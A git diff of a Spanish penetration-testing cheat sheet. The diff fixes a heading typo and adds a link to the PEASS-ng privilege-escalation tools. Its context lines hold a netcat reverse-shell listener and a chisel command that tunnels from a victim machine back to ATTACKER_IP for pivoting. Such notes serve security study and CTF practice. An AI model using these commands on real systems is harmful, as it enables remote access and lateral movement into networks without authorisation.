@@ -156,7 +156,7 @@ Shell nc
 ```
 nc -lvnp PORT
 ```
-Shell chetado
+Shell chetada
 ```
 rlwrap nc -lvnp PORT
 ```
@@ -173,6 +173,11 @@ Atacante
 Víctima
 ```
 ./chisel client ATTACKER_IP:ATTACKER_PORT R:VICTIM_IP:VICTIM_PORT
+```
+
+## PEASS-ng
+```
+https://github.com/carlospolop/PEASS-ng
 ```
 
 ## Mejorar Shell
